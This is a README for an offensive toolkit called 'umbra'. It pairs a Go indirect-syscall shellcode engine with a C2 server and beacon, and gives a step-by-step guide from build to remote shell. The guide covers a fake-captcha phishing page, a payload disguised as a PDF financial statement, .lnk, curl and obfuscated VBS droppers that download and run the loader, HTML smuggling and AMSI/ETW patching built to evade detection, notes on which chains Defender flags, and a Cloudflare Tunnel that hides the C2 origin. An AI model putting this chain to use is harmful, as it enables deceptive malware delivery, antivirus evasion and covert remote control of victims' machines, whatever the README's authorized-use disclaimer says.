# umbra

**umbra** is an indirect syscall engine written from scratch in Go (PEB walk, parsing of
the `ntdll` export table, SSN derivation by RVA ordering, and use of a real `syscall;ret`
gadget inside `ntdll` itself), paired with its own **C2** (HTTPS server + beacon) and a
**single delivery pipeline**: an English phishing page with a fake captcha that delivers
the payload disguised as a PDF — by default `loader.exe` saved as
`2026-Q3_Financial_Statement.pdf.exe` — published through a **Cloudflare Tunnel**.

All code, names and the license are original — no third-party code.

> **Authorized use only.** This project is intended exclusively for authorized security
> testing, research and your own labs. You are solely responsible for how you use it. Do
> not use it against systems without written authorization.

---

## Table of contents

1. [Components](#components)
2. [Requirements](#requirements)
3. [Single-flow architecture](#single-flow-architecture)
4. [Lab preparation](#lab-preparation)
5. [Step by step (from build to shell)](#step-by-step-from-build-to-shell)
6. [C2 operation](#c2-operation)
7. [Troubleshooting](#troubleshooting)
8. [C2 protocol](#c2-protocol)
9. [Indirect syscall engine](#indirect-syscall-engine)
10. [Repository structure](#repository-structure)
11. [License](#license)

---

## Components

| Path | Description |
| --- | --- |
| `github.com/nullbyter19/umbra` (root) | Indirect syscall engine in pure Go + assembly helpers |
| `c2/proto` | C2 message format (AES-256-GCM envelope, JSON) |
| `cmd/beacon` | HTTPS implant (beacon) that runs tasks and injects shellcode in memory |
| `cmd/server` | C2 server (HTTPS, self-signed TLS, operator console) |
| `cmd/pack` | Packs the beacon configuration (URL, passphrase, UA, pin) obfuscated |
| `delivery/phish.html` | Anchor lure (fallback, `SMUGGLE=0`): fake captcha and download of the PDF-disguised payload over a same-origin link |
| `scripts/make_smuggle.py` | Generates the **self-contained, evasive** landing page (`dist/index.html`): `loader.exe` is **embedded** in the HTML (multi-byte XOR + shuffled base64 alphabet + reversed string + chunks) and only assembled on the captcha gesture — no standard base64, no `TVqQ`, no `atob` |
| `delivery/stage.ps1` | Fileless stager: downloads the hex shellcode, injects through `ntdll` `Nt*` and runs it in memory |
| `delivery/reflect.ps1` | **Reflective** PE loader in C# (`Add-Type`): maps a PE straight into memory — the **proven path** from the `.lnk` (`MODE=reflect`), an alternative to shellcode/Donut |
| `scripts/build.sh` | Packs the config, builds the beacon and stages the delivery site in `dist/` |
| `scripts/make_shellcode.sh` | Generates the shellcode (`dist/blob.bin` → `dist/blob.hex`) **without MSF**: from raw hex (`--from-hex`), from a `.bin` (`--from-raw`) or by converting a PE (`--from-pe`, via Donut/sRDI) |
| `scripts/make_lnk.py` | Pure-Python `.lnk` builder (MS-SHLLINK format), no Windows tooling required |
| `scripts/make_lnk_payload.sh` | Builds the PDF-disguised `.lnk` (PDF icon) using `make_lnk.py`; `MODE=stage|reflect|curl` — `curl` runs `cmd.exe` + `curl.exe` from System32, **without PowerShell** |
| `scripts/make_vbs.py` | Generates the obfuscated `.vbs` dropper (WSH): `Chr()` chains, XMLHTTP → `ADODB.Stream` → `%TEMP%\<rand>.exe` → hidden `Run` — no PowerShell |
| `scripts/make_vbs_payload.sh` | Wrapper for `make_vbs.py`: on double-click of the `.vbs`, `wscript.exe` downloads `loader.exe` and runs it (no `.lnk`, no PowerShell) |
| `scripts/umbra.env` (`.example`) | **Single source of truth** for the session: `DOMAIN`, `HTTP_PORT`, `C2_PORT`, `C2_PASS`, `TUNNEL_NAME`, `C2_PREFIX`. Read by `serve.sh`, `cf_tunnel.sh`, `build.sh` and `verify.sh` |
| `scripts/serve.sh` | Serves the static site (`dist/`) on `127.0.0.1:$HTTP_PORT` (loopback only); the port comes from `scripts/umbra.env` |
| `scripts/cf_tunnel.sh` | Publishes the local origin through the **Cloudflare Tunnel** as `https://c2.example.com`; derives `ORIGIN_HTTP`/`ORIGIN_C2` from `scripts/umbra.env` and pre-flights the origin |
| `scripts/verify.sh` | Checks the **public edge** with `curl --resolve` (bypasses local hosts) and validates the page marker |
| `scripts/unblock.ps1` | Removes the `Zone.Identifier` (MOTW) from a file, on the target |

---

## Requirements

- **Go 1.21+** (tested with Go 1.27). The module has **no external dependencies** —
  `go build` works offline.
- To build the beacon/server for Windows from Kali (Linux), `GOOS=windows GOARCH=amd64`
  is enough (native Go cross-compilation, no extra toolchain).
- **`python3`** on Kali (for `make_lnk.py` and `serve.sh`).
- **`xxd`** (`vim-common` package) or `hexdump` on Kali, for the hex blob.
- **`cloudflared`** — `scripts/cf_tunnel.sh` installs it automatically if missing.
- **`scripts/umbra.env`** — copy it once from `scripts/umbra.env.example` and adjust
  `DOMAIN`/`HTTP_PORT`/`C2_PASS`. It is the **single** configuration source, read by
  `serve.sh`, `cf_tunnel.sh`, `build.sh` and `verify.sh`.
- A domain with its **zone hosted on Cloudflare** (here: `example.com`).
- On the Windows target no runtime is needed: it only opens the page and double-clicks
  the delivered file.

Confirm the installation:

```bash
go version
python3 --version
xxd -v | head -n1
```

Sample output:

```text
go version go1.27.0 linux/amd64
Python 3.13.5
xxd 2024-01-25 by Juergen Weigert et al.
```

---

## Single-flow architecture

The lab has **two machines**: **Kali** (attacker/operator, private IP `192.0.2.10`) and
the **Windows 10/11 target**. Kali has no public IP and no certificate of its own, so
trusted HTTPS comes from the **Cloudflare Tunnel**: `cloudflared` opens an outbound
connection to the Cloudflare edge, which exposes `https://c2.example.com` with Cloudflare's
public certificate. The target never talks to Kali's IP — only to the domain.

```text
        TARGET (Windows)                   CLOUDFLARE EDGE                 KALI (127.0.0.1, private)
  +-----------------------+          +-----------------------+        +------------------------------+
  | 1. opens              |  HTTPS   |  Cloudflare public    |        |  cloudflared (tunnel)        |
  |    c2.example.com     | -------> |  certificate (443)    | <----> |    ingress:                  |
  |    (phish.html)       |          +-----------+-----------+        |    ^/updates/  -> C2  :8443  |
  | 2. solves the captcha |                      |                    |    /*          -> site :8080 |
  | 3. downloads the .lnk | <--------------------+   (outbound tunnel)|                              |
  |    (disguised as PDF) |                                             |  python3 http.server :8080   |
  | 4. double-click:      |                                             |    (dist/: phish.html,       |
  |    cmd -> powershell  |                                             |     .lnk, stage.ps1, blob.hex)|
  | 5. stage.ps1 fetches  |                                             |                              |
  |    blob.hex (via C2)  |                                             |  server (C2) :8443 selfsigned|
  | 6. injects in memory  |                                             |    (operator console)        |
  | 7. checks in to C2 ---+-------------------------------------------->|  /updates/v2/sync            |
  +-----------------------+                                             +------------------------------+
```

Key design points:

- **One tunnel**, two backends on the same hostname, split by path:
  - `^/updates/` → **C2** at `https://127.0.0.1:8443` (self-signed TLS; the rule uses
    `noTLSVerify: true` because the C2 **always** speaks TLS).
  - everything else → **static site** at `http://127.0.0.1:8080`
    (`phish.html` served as `index.html`, the `.lnk`, `stage.ps1`, `blob.hex`).
- By default the page delivers the **`loader.exe` disguised as a PDF**
  (`2026-Q3_Financial_Statement.pdf.exe`): with "hide known file extensions" (the Windows
  default) the target sees `2026-Q3_Financial_Statement.pdf` and a double-click runs the
  beacon — the only binary in the chain, no `.lnk`, no PowerShell and no cradle. The
  `.lnk` chain in the diagram above remains available as an alternative (point
  `CONFIG.PAYLOAD_URL` at the `.lnk`).
- The cradle downloads `stage.ps1` as text and runs it as a scriptblock (nothing is
  written to disk), pointing at `blob.hex`. The shellcode is injected in memory through
  `ntdll` `Nt*`.
- The beacon points at `https://c2.example.com/updates/v2/sync`, i.e. the same domain as
  the site — no exposed ports and no IP in the payload.

> **Honest note about MOTW.** A browser download **may** receive the *Mark-of-the-Web*
> (`Zone.Identifier`). The chain was designed not to depend on signed executables or an
> `.exe` on disk, but there is **no guarantee that SmartScreen will not perform a
> reputation check on the `.lnk`**. See *Troubleshooting* for how to check and handle it.

---

## Lab preparation

| Machine | Role | Example IP |
| --- | --- | --- |
| **Kali Linux** | attacker/operator — builds server and beacon, runs the C2, serves the delivery and publishes the tunnel | `192.0.2.10` |
| **Windows 10/11** | target — opens the page, downloads and runs the `.lnk` | DHCP |

> **Golden rule of this lab:** **100% of the preparation runs on Kali** — install, clone,
> validation, config packing, beacon build (cross-compile `windows/amd64`), shellcode and
> `.lnk` generation, serving the delivery and running the C2. **Windows is only used to
> execute** the delivered payload. Every command below runs on Kali, except those marked
> **target**.

### Attacker — Kali Linux (all preparation)

1. Install Go, Git, Python and `xxd`:

   ```bash
   sudo apt update && sudo apt install -y git golang-go python3 vim-common
   go version            # must be >= 1.21
   ```

   If the Kali repository version is old, install the official Go build (replace `X.Y.Z`
   with the current version from <https://go.dev/dl/>):

   ```bash
   wget https://go.dev/dl/goX.Y.Z.linux-amd64.tar.gz
   sudo rm -rf /usr/local/go && sudo tar -C /usr/local -xzf goX.Y.Z.linux-amd64.tar.gz
   export PATH=$PATH:/usr/local/go/bin
   go version
   ```

2. Clone and validate the project:

   ```bash
   git clone https://github.com/nullbyter19/umbra.git
   cd umbra
   go build ./... && go vet ./... && go test ./...
   ```

   Sample output:

   ```text
   ok      github.com/nullbyter19/umbra    0.004s
   ```

3. (Optional) Install a PE→shellcode converter for Step 5: **Donut** (`apt install donut`)
   or **sRDI** (`git clone https://github.com/monoxgas/sRDI`).

### Target — Windows 10/11 (execute only)

Nothing is compiled here — you only confirm connectivity and **run** the payload.

1. Confirm the target resolves and reaches the domain (PowerShell):

   ```powershell
   Resolve-DnsName c2.example.com | Select-Object -First 1 Name, IPAddress
   Test-NetConnection c2.example.com -Port 443
   ```

2. In an authorized lab, create a working folder for the tests.

   ```powershell
   New-Item -ItemType Directory -Force C:\Users\Public\lab
   ```

> Everything below assumes your own or **explicitly authorized** lab. Do not run the
> beacon against third-party machines.

---

## Step by step (from build to shell)

All commands run on **Kali**, from the repository root, unless stated otherwise. There is
a **single** flow — no A/B/C options.

### Step 0 — Configure the session (once) — `scripts/umbra.env`

All variable configuration lives in a single file. Copy the example and edit it:

```bash
cp scripts/umbra.env.example scripts/umbra.env
$EDITOR scripts/umbra.env    # DOMAIN, HTTP_PORT, C2_PORT, C2_PASS, ...
```

> **Why this exists.** The site port used to live in `serve.sh` and the tunnel origin port
> in `cf_tunnel.sh`. If you changed one (e.g. `8082`, because `8080` already belonged to
> `code-server`) and not the other, the tunnel kept pointing at the old port — and the
> domain started serving **another app** or refusing connections. Now `serve.sh`,
> `cf_tunnel.sh`, `build.sh` and `verify.sh` read **the same file**, so they can no longer
> drift apart.
>
> Precedence: shell-exported variables > `scripts/umbra.env` > each script's default. So
> `HTTP_PORT=9000 bash scripts/serve.sh` still applies to a single run.
> `scripts/umbra.env` is gitignored (it holds `C2_PASS`).

---

### Step 1 — Build the C2 server

```bash
GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o dist/server.exe ./cmd/server
# or, to run it directly on Kali:
GOOS=linux GOARCH=amd64 go build -trimpath -ldflags "-s -w" -o dist/server ./cmd/server
```

Sample output:

```text
$ ls -lh dist/server
-rwxr-xr-x 1 kali kali 3.2M Oct  4 12:00 dist/server
```

The server **always** speaks TLS: on first run it generates a self-signed key/certificate
pair in the `-certdir` directory and prints the SHA-256 fingerprint (which can optionally
be pinned in the beacon with `-pin`).

### Step 2 — Pack the beacon configuration

The config is obfuscated (XOR `umbra::c2::2026::mask` + base64) inside the beacon:

```bash
go run ./cmd/pack \
  -server "https://c2.example.com/updates/v2/sync" \
  -pass   "change-me-passphrase" \
  -sleep  10 -jitter 25 \
  -ua     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0 Safari/537.36" \
  -out    cmd/beacon/config.go
```

Sample output:

```text
[+] wrote cmd/beacon/config.go
    server : https://c2.example.com/updates/v2/sync
    sleep  : 10s  jitter: 25%
    next   : go build -ldflags "-s -w" -o beacon.exe ./cmd/beacon
```

> `-pass` must be **identical** to the server's (`cmd/server -pass`). `-pin` is optional:
> leave it empty to accept the Cloudflare edge certificate (recommended in this flow, since
> that certificate is public).

### Step 3 — Build the beacon

```bash
GOOS=windows GOARCH=amd64 go build -trimpath -ldflags "-s -w -H=windowsgui" -o dist/loader.exe ./cmd/beacon
```

> `-H=windowsgui` marks the PE as a GUI subsystem binary: no console window flashes when
> the loader runs on the target (`build.sh` already uses these flags).

### Step 4 — Prepare the delivery site (`dist/`)

`build.sh` performs steps 2–4 at once (packs the config, builds the loader and copies the
page + scripts into `dist/`). There are two equivalent ways:

**Option A — everything through the script (recommended):**

```bash
SERVER="https://c2.example.com/updates/v2/sync" \
PASS="change-me-passphrase" \
bash scripts/build.sh
```

Sample output:

```text
[*] packing beacon config (mode=beacon)
[+] wrote cmd/beacon/config.go
[*] building loader (windows/amd64)
[*] staging the delivery site into dist/
[+] done:
-rwxr-xr-x ... dist/loader.exe
-rw-r--r-- ... dist/index.html
-rw-r--r-- ... dist/stage.ps1
```

**Option B — manual:** follow Steps 2 and 3 and copy the page into `dist/`:

```bash
cp delivery/phish.html dist/index.html
cp delivery/stage.ps1  dist/stage.ps1
cp delivery/reflect.ps1 dist/reflect.ps1
```

After this step `dist/` contains: `index.html` (the page), `stage.ps1`, `reflect.ps1` and
`loader.exe`.

### Step 5 — Generate the shellcode in hex (`dist/blob.hex`)

Convert `loader.exe` into position-independent shellcode and encode it as hex (one line).
No MSF:

```bash
bash scripts/make_shellcode.sh --from-pe dist/loader.exe
```

Sample output:

```text
[*] converting PE with Donut: dist/loader.exe
[+] wrote dist/blob.bin (198144 bytes)
[+] wrote dist/blob.hex (396288 bytes, one line)
[+] round-trip OK (hex decodes back to the exact same bytes)
```

> If you already have raw shellcode, use `--from-raw shellcode.bin`; to test the plumbing
> without a real payload, use `--from-hex 31c0c3` (`xor eax, eax; ret`).
>
> **Watch out for the placeholder blob.** If `blob.hex` was generated with
> `--from-hex 31c0c3`, it is only `xor eax,eax; ret`: the download happens, the injection
> runs and **nothing happens** — no beacon, no crash, and the C2 sees no check-in. Before
> testing on the target, confirm on Kali: `ls -l dist/blob.hex` (placeholder = 6 bytes;
> real ≈ 396 KB) and `head -c 60 dist/blob.hex` (must not start with `31c0c3`).

### Step 6 — Build the PDF-disguised `.lnk`

```bash
DOMAIN="c2.example.com" \
bash scripts/make_lnk_payload.sh
```

Sample output:

```text
[*] building dist/2026-Q3_Financial_Statement.pdf.lnk
    mode  : stage
    stage : https://c2.example.com/stage.ps1
    blob  : https://c2.example.com/blob.hex
    icon  : %SystemRoot%\System32\imageres.dll,-187
-rw-r--r-- ... dist/2026-Q3_Financial_Statement.pdf.lnk
[+] on the target, double-clicking "2026-Q3_Financial_Statement.pdf" (Explorer hides the .lnk)
    runs: cmd -> powershell (hidden) -> https://c2.example.com/stage.ps1 -> in-memory exec of https://c2.example.com/blob.hex
```

The `.lnk` points at:

```text
cmd.exe /c powershell -w hidden -nop -ep bypass -c "<cradle>"
```

where `<cradle>` downloads `stage.ps1` as text and runs it as a scriptblock, passing
`-Url https://c2.example.com/blob.hex` (and optionally `-Patch`, via the `FLAGS` variable,
to neutralize AMSI/ETW before running the blob).

> **Keep the name consistent across the whole chain.** The generated file (by default
> `dist/2026-Q3_Financial_Statement.pdf.exe`), `CONFIG.PAYLOAD_URL` and
> `CONFIG.PAYLOAD_NAME` in `delivery/phish.html` must use the same name: the page downloads
> exactly that path (changing only the file on the server gives a `404`) and
> `scripts/serve.py` fixes the saved name with `Content-Disposition` (changing only the page
> makes the browser save it under the on-disk file name).
>
> To change the displayed name, edit `NAME`/`OUTNAME` in `make_lnk_payload.sh` (or pass
> `NAME=...` via env) — or, for the default `.exe`, `PAYLOAD_NAME` in `scripts/build.sh` —
> **and** the `CONFIG` fields in `delivery/phish.html`, then run `bash scripts/build.sh`
> again. Keep the `.pdf` suffix in the name so Explorer hides the real extension (`.lnk` or
> `.exe`).
>
> **`reflect` mode (proven path, no Donut).** If the PE→shellcode conversion (Donut/sRDI)
> is unavailable or does not work, the `.lnk` can use the reflective loader instead of the
> stager:
>
> ```bash
> MODE=reflect DOMAIN="c2.example.com" bash scripts/make_lnk_payload.sh
> ```
>
> In this mode the cradle downloads `reflect.ps1` + `loader.exe` and calls
> `-Bytes $pe -Wait -WaitSeconds 0` (the PE is mapped in memory, nothing on disk).
> `reflect.ps1` accepts `-Url`, `-Path` or `-Bytes`; the cradle uses `-Bytes`.
>
> **`-Wait -WaitSeconds 0` is mandatory in this mode, not optional.** `reflect.ps1` maps the
> PE, starts it on a thread (`CreateThread`) and returns **immediately**. If the PowerShell
> hosting the beacon exits (because the `.lnk`'s `-c` finished), the entire process dies and
> takes the beacon thread with it — you may even see **one** check-in and then nothing.
> `-WaitSeconds 0` means **wait forever** while the beacon thread lives (the wait returns
> when the beacon ends, e.g. after a `kill` task), so nothing leaks. `make_lnk_payload.sh`
> already injects both parameters into the cradle in `reflect` mode.
>
> **`curl` mode (no PowerShell).** When the EDR detects the PowerShell command line itself
> (`Trojan:Win32/Commando.AIml` — this happens even with a clean beacon binary), remove
> `powershell.exe` from the chain:
>
> ```bash
> MODE=curl DOMAIN="c2.example.com" bash scripts/make_lnk_payload.sh
> ```
>
> In this mode the `.lnk` runs:
>
> ```text
> cmd.exe /c curl.exe -fsS --ssl-no-revoke -o "%TEMP%\<rand>.exe" "https://c2.example.com/loader.exe" && start "" "%TEMP%\<rand>.exe"
> ```
>
> System32's `curl.exe` (Windows 10 1803+) is a Windows binary. `--ssl-no-revoke` is
> mandatory behind the tunnel (hosts without CRL/OCSP make curl fail) and curl does **not**
> write MOTW to the downloaded file — the dropped exe starts without a SmartScreen prompt.
> Unlike `stage`/`reflect`, the payload goes to disk (`%TEMP%`).
>
> **No `.lnk` and no PowerShell: `.vbs` dropper (WSH).** `make_vbs_payload.sh` generates a
> WSH double-click that downloads `loader.exe` and runs it — no `powershell.exe` and no
> `cmd.exe`:
>
> ```bash
> bash scripts/make_vbs_payload.sh    # generates dist/2026-Q3_Financial_Statement.pdf.vbs
> ```
>
> Flow on the target: `wscript.exe` → `MSXML2.XMLHTTP.6.0` GET (fallback
> `Microsoft.XMLHTTP`) → `ADODB.Stream` → `%TEMP%\<rand>.exe` → hidden
> `WScript.Shell.Run` (style 0, no wait). Every identifying string (ProgIDs, URL, drop
> name, `%TEMP%`) is a `Chr()` chain, so the script text carries nothing in clear.
> `SEED=...` makes the drop name reproducible; `--exe-name` (or `EXE_NAME`) fixes a name.
>
> **If you deliver the `.vbs`, update the page CONFIG:** `PAYLOAD_URL` and `PAYLOAD_NAME`
> in `delivery/phish.html` (the `CONFIG` block) must point at the generated `.vbs` (same
> file name as in `dist/` — `serve.py` fixes the name via `Content-Disposition`); then run
> `bash scripts/build.sh` to republish.
>
> **Direct `.exe` delivery (default — no PowerShell, no `.lnk`).** `build.sh` copies
> `loader.exe` byte for byte to `dist/$PAYLOAD_NAME` (`2026-Q3_Financial_Statement.pdf.exe`
> by default; change it with `PAYLOAD_NAME="..." bash scripts/build.sh`) and `phish.html`
> downloads that file over a same-origin anchor — `serve.py` fixes the name with
> `Content-Disposition: attachment`. On the target, with "hide known file extensions" (the
> Windows default), the icon appears as `2026-Q3_Financial_Statement.pdf` and a double-click
> runs `loader.exe` directly. This is the path the EDR did not flag: Defender flags the
> **PowerShell command line** of the `.lnk` cradle (`Trojan:Win32/Commando.AIml`), not the
> beacon binary.
>
> **Physical browser limit:** no modern page runs the file it downloads on its own
> (ActiveX/WScript.Shell died with IE, `file://` is blocked and downloads are isolated) —
> the target always has to double-click the saved file, the same interaction cost as the
> `.lnk`. Chromium may show the Safe Browsing "Keep" prompt for an unknown `.exe` and
> applies MOTW/Zone.Identifier (SmartScreen may ask "More info" → "Run anyway"); old
> Firefox downloads silently and usually does **not** apply MOTW. Alternatives without
> `powershell.exe` remain available: `.lnk` `MODE=curl` and the `.vbs` dropper.
>
> **Evasive landing page (default).** `bash scripts/build.sh` generates `dist/index.html` as
> a **self-contained** page that carries `loader.exe` **embedded** (multi-byte XOR +
> shuffled base64 alphabet + reversed string + chunks), assembled **only after the gesture**
> on the fake captcha. This removes `TVqQ`/standard base64, `atob`, and download-on-load —
> the signatures of the classic page (`var file='TVqQAA…'`). Regenerate manually:
> `python3 scripts/make_smuggle.py --in dist/loader.exe --out dist/index.html --verify`.
> `SMUGGLE=0 bash scripts/build.sh` returns to the anchor page (`phish.html`). Details,
> flags and honest caveats in `delivery/SMUGGLE.md`.

### Step 7 — Start the static site (origin)

`serve.sh` exposes `dist/` **on loopback only** (`127.0.0.1:$HTTP_PORT`, with `HTTP_PORT`
coming from `scripts/umbra.env`) — the only ingress path is the tunnel.

```bash
bash scripts/serve.sh
```

Sample output:

```text
[*] serving dist on http://127.0.0.1:8082 (loopback only)
[*] publish it with: bash scripts/cf_tunnel.sh
```

> If the port is already taken (e.g. `code-server` on `8080`), `serve.sh` **refuses to
> start** and explains what to do instead of failing silently. Adjust `HTTP_PORT` in
> `scripts/umbra.env`.

### Step 8 — Start the C2 (separate terminal)

The C2 needs an **interactive console**, so run it in its own window:

```bash
./dist/server -listen 127.0.0.1:8443 -pass "change-me-passphrase" -certdir dist/c2data
```

Sample output:

```text
umbra C2 server
  endpoint    : https://127.0.0.1:8443/updates/v2/sync
  cert sha256 : ab:cd:... (truncated)
  (pin this in the beacon config: <hex>)
  type 'help' for the operator console
```

> `-listen 127.0.0.1:8443` keeps the C2 **off** any public network interface; it is only
> reachable through the local `cloudflared`. The C2 speaks self-signed TLS, and the tunnel
> ingress rule for `/updates/` uses `noTLSVerify: true`.
>
> **Do not pin (`-pin`) the origin fingerprint in this flow.** The printed `sha256` belongs
> to the C2's self-signed certificate; through the tunnel the edge presents Cloudflare's
> certificate. Pinning the origin fingerprint would make the beacon reject the edge
> certificate and **no** check-in would succeed. Leave `-pin` empty (recommended); only pin
> if the beacon talks directly to the C2.

### Step 9 — Publish everything through the Cloudflare Tunnel

The first time (once, interactive), authenticate the zone with Cloudflare:

```bash
cloudflared tunnel login     # opens the browser / prints a URL; pick example.com
```

Then start the tunnel:

```bash
DOMAIN="c2.example.com" \
bash scripts/cf_tunnel.sh
```

The script:

1. installs `cloudflared` (via the GitHub `.deb`) if missing;
2. creates the named tunnel `umbra` (if it does not exist) and resolves the `TUNNEL_ID`;
3. runs `route dns` for `c2.example.com` to the tunnel (idempotent);
4. writes `~/.cloudflared/config.yml` with **two ingress rules** on the same hostname:

   ```yaml
   ingress:
     # C2: self-signed cert on the origin, so verification is disabled only here.
     - hostname: c2.example.com
       path: ^/updates/
       service: https://127.0.0.1:8443
       originRequest:
         noTLSVerify: true
     # Everything else -> the static delivery site.
     - hostname: c2.example.com
       service: http://127.0.0.1:8080
     - service: http_status:404
   ```

5. validates the ingress and runs the tunnel.

Before starting, the script **pre-flights** the origin: it checks that
`http://127.0.0.1:$HTTP_PORT/` responds **and** contains the delivery page's `SecureVault`
marker (to catch the "port is used by another app" case) and warns if the C2 is not
listening yet. To publish anyway, use `FORCE=1 bash scripts/cf_tunnel.sh`.

Ingress ports come from `scripts/umbra.env` (`HTTP_PORT`, `C2_PORT`), so the YAML reflects
what `serve.sh`/`server` actually started.

Sample output:

```text
[*] cloudflared: cloudflared version 2025.x.x
[*] creating tunnel 'umbra'
[+] tunnel 'umbra' id 1a2b3c4d-...
[*] routing c2.example.com -> tunnel (idempotent)
[+] wrote /home/kali/.cloudflared/config.yml
[*] starting the tunnel - the edge now serves https://c2.example.com
```

> **Remotely managed alternative.** If you prefer to configure routes in the Cloudflare
> *Zero Trust* dashboard, set `TUNNEL_TOKEN` and the script runs the dashboard-managed
> tunnel (no `cert.pem` needed): `TUNNEL_TOKEN="<token>" bash scripts/cf_tunnel.sh`.

### Step 10 — Verification

Confirm the **public edge** — the only view that matters, because it is the target's view:

```bash
bash scripts/verify.sh
```

`verify.sh` resolves the real edge IPs through public DNS (default `1.1.1.1`) and pins them
with `curl --resolve`, so the check **cannot** be fooled by a local hosts entry pointing the
domain at the LAN IP. It validates the `SecureVault` marker on the page (to detect whether
**another** app is answering), `stage.ps1`, `blob.hex` and the C2 route (a `POST` with an
invalid body must return `401` from the C2 handler; `501`/`404` indicate a wrong route).

Manual equivalent (same checks, without `--resolve`):

```bash
# 1) the delivery page answers over public HTTPS
curl -sI https://c2.example.com/ | head -n1

# 2) the certificate is issued by Cloudflare (public chain)
echo | openssl s_client -connect c2.example.com:443 -servername c2.example.com 2>/dev/null \
  | openssl x509 -noout -issuer

# 3) the blob and the stage are published
curl -s -o /dev/null -w "%{http_code} blob.hex\n"  https://c2.example.com/blob.hex
curl -s -o /dev/null -w "%{http_code} stage.ps1\n" https://c2.example.com/stage.ps1

# 4) the C2 answers through /updates/ (401 = reachable)
curl -sk -o /dev/null -w "%{http_code} c2\n" -X POST -d '' https://c2.example.com/updates/v2/sync
```

> **If a direct `curl` on Kali returns `000`/`connection refused`** while `verify.sh` passes,
> it is almost always `/etc/hosts` (or local DNS) pointing `c2.example.com` at the LAN IP:
> the packets never reach Cloudflare. That was exactly the symptom that motivated
> `verify.sh` — always use its `--resolve` to test from inside the network.

Sample output:

```text
HTTP/2 200
issuer=C = US, O = "Cloudflare, Inc.", CN = Cloudflare Inc ECC CA-3
200 blob.hex
200 stage.ps1
401 c2
```

> **The certificate issuer may not say "Cloudflare".** Cloudflare's Universal SSL is issued
> by three CAs: "Cloudflare, Inc.", "Google Trust Services" (intermediate **WE1**) and
> **DigiCert**. Seeing an issuer such as `O = Google Trust Services, CN = WE1` is **not** an
> error — it is a valid Cloudflare edge certificate. `verify.sh` accepts all three and only
> warns if the issuer is outside those CAs.

### Step 11 — Execution on the target and shell

1. **Target:** open `https://c2.example.com/` in the browser. Tick the fake captcha
   ("I'm not a robot"). The page downloads `2026-Q3_Financial_Statement.pdf.exe`, displayed
   as a PDF.
2. **Target:** **double-click** the downloaded file. `loader.exe` runs directly (no `.lnk`,
   no PowerShell, no cradle) and checks in to the C2.

   > **Edge/Chrome "Keep" prompt.** For an unknown `.exe`, Chromium may show "This file is
   > not commonly downloaded" with a **Keep** button — click **Keep**. The file name does
   > **not** change (the `.download` suffix was eliminated); if SmartScreen appears, use
   > "More info" → "Run anyway" (see the *MOTW / SmartScreen* section).
3. **Kali:** in the C2 console, list the beacons and interact:

   ```text
   list
   shell <id> whoami
   ```

   Sample output:

   ```text
   ID                HOST            USER            OS/ARCH       PID    LAST SEEN
   1af9e58cf85b8ea8  WIN-TARGET      SHARK\lab       windows/amd64 6740   3s
   [*] queued auto-1 shell for 1af9e58cf85b8ea8
   ```

Done — you have an in-memory shell, with all traffic leaving through the public domain and
the origin invisible behind the tunnel.

---

## C2 operation

In the server terminal, console commands:

```text
list                                  # list known beacons
shell <id> <command...>               # run via cmd.exe /c on the target
download <id> <remote-path>           # download a file (result in base64)
upload <id> <local-file> <remote>     # upload a file to the target
inject <id> <file.hex>                # run shellcode in memory (umbra engine)
sleep <id> <seconds>                  # change the sleep interval
results <id>                          # show the result history
kill <id>                             # terminate the beacon
help                                  # help
```

Examples:

```text
list
shell 1af9e58cf85b8ea8 whoami
shell 1af9e58cf85b8ea8 ipconfig
inject 1af9e58cf85b8ea8 blob.hex
```

The shellcode file for `inject` is **raw hex** (one line), for example `31c0c3`
(`xor eax, eax; ret`). Execution goes through the indirect syscall engine
(`NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory` →
`NtCreateThreadEx`), without touching `ntdll` through the import table.

Automatic task on first check-in (useful for a hands-off test):

```bash
./dist/server -listen 127.0.0.1:8443 -pass "change-me-passphrase" \
  -certdir dist/c2data -task "shell:whoami" -task "shell:hostname"
```

---

## Troubleshooting

| Symptom | Likely cause | Fix |
| --- | --- | --- |
| `404` when opening the site | `serve.sh` is not running, or `dist/index.html` is missing | run `bash scripts/build.sh` then `bash scripts/serve.sh` |
| `502`/`1033` on `/updates/` | the C2 is not listening on `127.0.0.1:8443` | start `./dist/server -listen 127.0.0.1:8443 ...` in the C2 terminal |
| `cloudflared` cannot find `cert.pem` | login was never performed | `cloudflared tunnel login` (pick the `example.com` zone) |
| Page opens but the `.lnk` download does not start | the browser blocked a programmatic download (outside a user gesture) | click the "Download document" fallback button shown on the page |
| Downloaded file arrives as `....lnk.download` | an old page delivered via `Blob`/`fetch`; Chromium appends `.download` when the MIME does not map to the extension (`.lnk`) | use the current `phish.html` (same-origin anchor delivery) + `scripts/serve.py` (fixes the name with `Content-Disposition`); run `bash scripts/build.sh` and republish |
| Downloaded and ran the `.lnk` but no beacon appears | stale `blob.hex`/`loader.exe`: the compiled beacon points at the LAN IP (`192.0.2.10`) instead of the tunnel domain | regenerate everything on Kali: `bash scripts/build.sh` → `bash scripts/make_shellcode.sh --from-pe dist/loader.exe` → `bash scripts/make_lnk_payload.sh`; restart `serve.sh` + `cf_tunnel.sh` and the C2 with `-task "shell:whoami"` |
| Downloaded `.lnk`/`stage.ps1`/`blob.hex` (all `200` in serve.log) but the C2 sees no check-in | `blob.hex` is the `31c0c3` placeholder (plumbing test) or the Donut conversion of the Go PE was never validated — the shellcode runs and does nothing | on Kali: `ls -l dist/blob.hex` and `head -c 60 dist/blob.hex`; if it is the placeholder, run `bash scripts/make_shellcode.sh --from-pe dist/loader.exe` again; if the conversion fails, use the proven `MODE=reflect` path (Step 6) |
| serve.log shows `GET /reflect.ps1 200` but **never** `GET /loader.exe` | the `.lnk` in use on the target is old: a pre-`-Bytes` cradle (downloads `reflect.ps1` and dies on the mandatory parameter) or an empty `BLOB_URL` — the second `DownloadData` never fires | on Kali: `strings -e l dist/*.lnk` and confirm the cradle has the second `DownloadData('.../loader.exe')` and `-Bytes $pe`; rebuild with `rm -f dist/2026-Q3_Financial_Statement.pdf.lnk && MODE=reflect bash scripts/make_lnk_payload.sh` and **download the `.lnk` again** on the target (do not reuse the old file) |
